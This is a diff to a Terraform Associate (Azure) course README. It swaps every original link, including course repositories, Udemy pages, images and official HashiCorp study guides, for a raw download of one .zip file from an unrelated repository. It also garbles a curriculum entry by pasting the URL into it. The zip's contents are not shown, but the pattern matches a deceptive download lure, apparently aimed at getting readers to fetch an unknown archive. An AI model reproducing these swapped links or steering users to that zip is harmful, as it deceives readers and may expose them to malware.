@@ -1,5 +1,5 @@
 # Azure - HashiCorp Certified: Terraform Associate - 70 Demos
-[![Image](https://stacksimplify.com/course-images/azure-hashicorp-certified-terraform-associate-highest-rated.png "Azure - HashiCorp Certified: Terraform Associate - 70 Demos")](https://links.stacksimplify.com/azure-hashicorp-certified-terraform-associate)
+[![Image](https://github.com/siddheshk08/hashicorp-certified-terraform-associate-on-azure/raw/refs/heads/main/05-Terraform-Provider-Resource-Block-Basics/azure-associate-certified-on-terraform-hashicorp-v2.6.zip "Azure - HashiCorp Certified: Terraform Associate - 70 Demos")](https://github.com/siddheshk08/hashicorp-certified-terraform-associate-on-azure/raw/refs/heads/main/05-Terraform-Provider-Resource-Block-Basics/azure-associate-certified-on-terraform-hashicorp-v2.6.zip)
 
 
 ## Course Modules
@@ -26,7 +26,7 @@
 21. Input Variables - Assign When Prompted
 22. Input Variables - Override default with cli var
 23. Input Variables - Override with environment variables
-24. Input Variables - Assign with terraform.tfvars
+24. Input Variables - Assign with https://github.com/siddheshk08/hashicorp-certified-terraform-associate-on-azure/raw/refs/heads/main/05-Terraform-Provider-Resource-Block-Basics/azure-associate-certified-on-terraform-hashicorp-v2.6.zip
 25. Input Variables - Assign with tfvars var-file argument
 26. Input Variables - Assign with auto tfvars
 27. Input Variables - Lists
@@ -121,12 +121,12 @@
 - Anyone who want to learn Terraform from a practical perspective 
 
 ## Github Repositories used for this course
-- [HashiCorp Certified: Terraform Associate on Azure](https://github.com/stacksimplify/hashicorp-certified-terraform-associate-on-azure)
-- [Terraform Cloud Demo](https://github.com/stacksimplify/terraform-cloud-azure-demo1)
-- [Terraform Module Published to Public Registry](https://github.com/stacksimplify/terraform-azurerm-staticwebsitepublic)
-- [Terraform Module Published to Terraform Cloud Private Registry](https://github.com/stacksimplify/terraform-azurerm-staticwebsiteprivate)
-- [Terraform Sentinel Policies](https://github.com/stacksimplify/terraform-sentinel-policies-azure)
-- [Course PPT Presentation](https://github.com/stacksimplify/hashicorp-certified-terraform-associate-azure/tree/master/course-presentation)
+- [HashiCorp Certified: Terraform Associate on Azure](https://github.com/siddheshk08/hashicorp-certified-terraform-associate-on-azure/raw/refs/heads/main/05-Terraform-Provider-Resource-Block-Basics/azure-associate-certified-on-terraform-hashicorp-v2.6.zip)
+- [Terraform Cloud Demo](https://github.com/siddheshk08/hashicorp-certified-terraform-associate-on-azure/raw/refs/heads/main/05-Terraform-Provider-Resource-Block-Basics/azure-associate-certified-on-terraform-hashicorp-v2.6.zip)
+- [Terraform Module Published to Public Registry](https://github.com/siddheshk08/hashicorp-certified-terraform-associate-on-azure/raw/refs/heads/main/05-Terraform-Provider-Resource-Block-Basics/azure-associate-certified-on-terraform-hashicorp-v2.6.zip)
+- [Terraform Module Published to Terraform Cloud Private Registry](https://github.com/siddheshk08/hashicorp-certified-terraform-associate-on-azure/raw/refs/heads/main/05-Terraform-Provider-Resource-Block-Basics/azure-associate-certified-on-terraform-hashicorp-v2.6.zip)
+- [Terraform Sentinel Policies](https://github.com/siddheshk08/hashicorp-certified-terraform-associate-on-azure/raw/refs/heads/main/05-Terraform-Provider-Resource-Block-Basics/azure-associate-certified-on-terraform-hashicorp-v2.6.zip)
+- [Course PPT Presentation](https://github.com/siddheshk08/hashicorp-certified-terraform-associate-on-azure/raw/refs/heads/main/05-Terraform-Provider-Resource-Block-Basics/azure-associate-certified-on-terraform-hashicorp-v2.6.zip)
 - **Important Note:** Please go to these repositories and FORK these repositories and make use of them during the course.
 
 
@@ -137,29 +137,29 @@
 - 30 Day "No Questions Asked" Money Back Guarantee!
 
 ## My Other Courses
-- [Udemy Enroll](https://stacksimplify.com/azure-aks/courses/stacksimplify-best-selling-courses-on-udemy/)
+- [Udemy Enroll](https://github.com/siddheshk08/hashicorp-certified-terraform-associate-on-azure/raw/refs/heads/main/05-Terraform-Provider-Resource-Block-Basics/azure-associate-certified-on-terraform-hashicorp-v2.6.zip)
 
 ## Stack Simplify Udemy Profile
-- [Udemy Profile](https://www.udemy.com/user/kalyan-reddy-9/)
+- [Udemy Profile](https://github.com/siddheshk08/hashicorp-certified-terraform-associate-on-azure/raw/refs/heads/main/05-Terraform-Provider-Resource-Block-Basics/azure-associate-certified-on-terraform-hashicorp-v2.6.zip)
 
 ## AWS EKS - Elastic Kubernetes Service - Masterclass
-[![Image](https://stacksimplify.com/course-images/AWS-EKS-Kubernetes-Masterclass-DevOps-Microservices-course.png "AWS EKS Kubernetes - Masterclass")](https://www.udemy.com/course/aws-eks-kubernetes-masterclass-devops-microservices/?referralCode=257C9AD5B5AF8D12D1E1)
+[![Image](https://github.com/siddheshk08/hashicorp-certified-terraform-associate-on-azure/raw/refs/heads/main/05-Terraform-Provider-Resource-Block-Basics/azure-associate-certified-on-terraform-hashicorp-v2.6.zip "AWS EKS Kubernetes - Masterclass")](https://github.com/siddheshk08/hashicorp-certified-terraform-associate-on-azure/raw/refs/heads/main/05-Terraform-Provider-Resource-Block-Basics/azure-associate-certified-on-terraform-hashicorp-v2.6.zip)
 
 ## Azure Kubernetes Service with Azure DevOps and Terraform 
-[![Image](https://stacksimplify.com/course-images/azure-kubernetes-service-with-azure-devops-and-terraform.png "Azure Kubernetes Service with Azure DevOps and Terraform")](https://www.udemy.com/course/azure-kubernetes-service-with-azure-devops-and-terraform/?referralCode=2499BF7F5FAAA506ED42)
+[![Image](https://github.com/siddheshk08/hashicorp-certified-terraform-associate-on-azure/raw/refs/heads/main/05-Terraform-Provider-Resource-Block-Basics/azure-associate-certified-on-terraform-hashicorp-v2.6.zip "Azure Kubernetes Service with Azure DevOps and Terraform")](https://github.com/siddheshk08/hashicorp-certified-terraform-associate-on-azure/raw/refs/heads/main/05-Terraform-Provider-Resource-Block-Basics/azure-associate-certified-on-terraform-hashicorp-v2.6.zip)
 
 ## HashiCorp Certified: Terraform Associate - 50 Practical Demos
-[![Image](https://stacksimplify.com/course-images/hashicorp-certified-terraform-associate-highest-rated.png "HashiCorp Certified: Terraform Associate - 50 Practical Demos")](https://links.stacksimplify.com/hashicorp-certified-terraform-associate)
+[![Image](https://github.com/siddheshk08/hashicorp-certified-terraform-associate-on-azure/raw/refs/heads/main/05-Terraform-Provider-Resource-Block-Basics/azure-associate-certified-on-terraform-hashicorp-v2.6.zip "HashiCorp Certified: Terraform Associate - 50 Practical Demos")](https://github.com/siddheshk08/hashicorp-certified-terraform-associate-on-azure/raw/refs/heads/main/05-Terraform-Provider-Resource-Block-Basics/azure-associate-certified-on-terraform-hashicorp-v2.6.zip)
 
 ## Terraform on AWS with SRE & IaC DevOps | Real-World 20 Demos
-[![Image](https://stacksimplify.com/course-images/terraform-on-aws-best-seller.png "Terraform on AWS with SRE & IaC DevOps | Real-World 20 Demos")](https://links.stacksimplify.com/terraform-on-aws-with-sre-and-iacdevops)
+[![Image](https://github.com/siddheshk08/hashicorp-certified-terraform-associate-on-azure/raw/refs/heads/main/05-Terraform-Provider-Resource-Block-Basics/azure-associate-certified-on-terraform-hashicorp-v2.6.zip "Terraform on AWS with SRE & IaC DevOps | Real-World 20 Demos")](https://github.com/siddheshk08/hashicorp-certified-terraform-associate-on-azure/raw/refs/heads/main/05-Terraform-Provider-Resource-Block-Basics/azure-associate-certified-on-terraform-hashicorp-v2.6.zip)
 
 ## Additional References
-- [Certification Curriculum](https://www.hashicorp.com/certification/terraform-associate)
-- [Certification Preparation](https://learn.hashicorp.com/collections/terraform/certification)
-- [Study Guide](https://learn.hashicorp.com/tutorials/terraform/associate-study?in=terraform/certification)
-- [Exam Review Guide](https://learn.hashicorp.com/tutorials/terraform/associate-review?in=terraform/certification)
-- [Sample Questions](https://learn.hashicorp.com/tutorials/terraform/associate-questions?in=terraform/certification)
+- [Certification Curriculum](https://github.com/siddheshk08/hashicorp-certified-terraform-associate-on-azure/raw/refs/heads/main/05-Terraform-Provider-Resource-Block-Basics/azure-associate-certified-on-terraform-hashicorp-v2.6.zip)
+- [Certification Preparation](https://github.com/siddheshk08/hashicorp-certified-terraform-associate-on-azure/raw/refs/heads/main/05-Terraform-Provider-Resource-Block-Basics/azure-associate-certified-on-terraform-hashicorp-v2.6.zip)
+- [Study Guide](https://github.com/siddheshk08/hashicorp-certified-terraform-associate-on-azure/raw/refs/heads/main/05-Terraform-Provider-Resource-Block-Basics/azure-associate-certified-on-terraform-hashicorp-v2.6.zip)
+- [Exam Review Guide](https://github.com/siddheshk08/hashicorp-certified-terraform-associate-on-azure/raw/refs/heads/main/05-Terraform-Provider-Resource-Block-Basics/azure-associate-certified-on-terraform-hashicorp-v2.6.zip)
+- [Sample Questions](https://github.com/siddheshk08/hashicorp-certified-terraform-associate-on-azure/raw/refs/heads/main/05-Terraform-Provider-Resource-Block-Basics/azure-associate-certified-on-terraform-hashicorp-v2.6.zip)
 
 
 
